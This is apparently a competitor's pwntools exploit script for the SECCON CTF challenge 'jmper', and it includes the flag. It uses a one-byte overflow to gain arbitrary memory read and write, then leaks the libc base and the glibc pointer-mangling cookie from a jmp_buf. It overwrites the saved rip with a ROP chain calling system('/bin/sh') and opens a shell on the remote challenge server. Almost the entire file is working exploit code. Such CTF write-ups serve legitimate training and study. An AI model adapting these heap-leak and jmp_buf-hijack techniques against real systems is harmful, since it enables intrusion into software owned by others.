from pwn import *

# SECCON{3nj0y_my_jmp1n9_serv1ce}

"""
xor     rdx, fs:30h
rol     rdx, 11h

struct jmpbuf {
/* 00 */    long rbx,
/* 08 */         rbp_s,
/* 10 */         r12, r13,
/* 20 */         r14, r15,
/* 30 */         rsp_s, rip_s;
/* 40 */         from_sigprocmask, a_bit;
};

struct student {
    int64_t number;
    char    memo[32];
    char    *name_ptr;
};
"""

binary = ELF('jmper')
#io = process('./jmper'); libc = ELF('/lib/x86_64-linux-gnu/libc.so.6'); gdb.attach(io)
io = remote('jmper.pwn.seccon.jp', 5656); libc = ELF('libc-2.19.so-8674307c6c294e2f710def8c57925a50e60ee69e')

# one_gadget = 0x4647c
# one_gadget = 0x4526a # local
# malloc_hook = libc.symbols['__malloc_hook']
system = libc.symbols['system']
binsh = next(libc.search('/bin/sh\0'))

print '[libc offsets]'
print 'binsh: %.8x' % binsh
print 'system: %.8x' % system


ADD, NAME, MEMO, SHOW_NAME, SHOW_MEMO, BYE = list(range(1, 7))

def menu(s):
    """
    1. Add student.
    2. Name student.
    3. Write memo
    4. Show Name
    5. Show memo.
    6. Bye :)
    """
    io.recvuntil('6. Bye :)')
    io.recvline()
    io.sendline(str(s))

def read(type_, id_):
    menu(type_)
    io.recvuntil(':'); io.sendline(str(id_))
    return io.recvuntil('1. Add student.')[:-15]

def write(type_, id_, ctx):
    menu(type_)
    io.recvuntil(':'); io.sendline(str(id_))
    io.recvuntil(':'); io.sendline(str(ctx))

menu(ADD)
menu(ADD)
# fill gap between student.memo and student.buff_ptr, then leak address of heap
write(MEMO, 0, 'A' * 32)
m = read(SHOW_MEMO, 0) # read address of heap

first_name_ptr = u64(m[32:40].ljust(8, '\0'))
first_student = first_name_ptr - 0x40
second_student = first_name_ptr + 0x30
second_name_ptr = second_student + 0x40
jmp_buf = first_student - 0xd0

print('jmp_buf at %.8x' % jmp_buf)
for i, addr in enumerate((first_student, first_name_ptr, second_student, second_name_ptr)):
    print('malloc[%d] = %.8x' % (i, addr))

# calculate what to write, make student[0].name_buf point to &student[1].name_buf
write_byte = (second_student + 8 + 32) & 0xff
assert write_byte >= (first_name_ptr & 0xff)

# one byte overwrite vulnerability on student.memo
write(MEMO, 0, 'A' * 32 + p8(write_byte))

# make sure it succeed!
m = read(SHOW_NAME, 0)
check = u64(m.ljust(8, '\0'))
assert check == second_name_ptr

# write student[0].name_ptr which writes to &student[1].name_ptr
def seek(addr):
    addr = p64(addr)
    assert '\n' not in addr
    write(NAME, 0, addr)

# read student[1].name_ptr which reads arbitrary memory since we can control student[1].name_ptr
def readmem_(addr):
    seek(addr)
    return read(SHOW_NAME, 1) + '\0'

# readmem_ truncates at null-byte, make sure we readed enough memory
def readmem(addr, sz=None):
    if not sz:
        return readmem_(addr)
    data = ''
    S = sz
    while sz > 0:
        r = readmem_(addr)
        data += r
        addr += len(r)
        sz -= len(r)
    return data[:S]

# works same as readmem_, but write things
def writemem(addr, data):
    seek(addr)
    assert '\n' not in data
    write(NAME, 1, data)

# leak address of printf
printf = u64(readmem(binary.got['printf'], 8))
libc_base = printf - libc.symbols['printf']
print 'libc_base = %.12x' % libc_base

# read content from jmp_buf
r = readmem(jmp_buf + 0x30, 16) # rsp_s, rip_s
# decrypt protected rsp_s, calculate cookie
rsp_s = ror(u64(r[:8]), 0x11, 64)
rip_s = ror(u64(r[8:]), 0x11, 64)
cookie = rip_s ^ 0x400c31
rsp = rsp_s ^ cookie

print 'leaked cookie = %16x' % cookie
print 'rsp = %16x' % rsp

pop_rdi = 0x400cc3 # rop gadget

# full chain is: [ pop_rdi, _bin_sh, system ]
ropchain = p64(binsh + libc_base) + p64(system + libc_base)

print 'Write ROP chian to stack'
writemem(rsp, ropchain)

# encrypt new rip and overwrite it, which jumps to first gadget
print 'Write jmp_buf'
rip_s = rol(pop_rdi ^ cookie, 0x11, 64)
writemem(jmp_buf + 0x38, p64(rip_s))

print 'Trigger longjmp'
for i in range(29):
    menu(ADD)

assert 'Exception has occurred. Jump!' in io.recvline()

print 'You got a shell :)'
io.interactive()
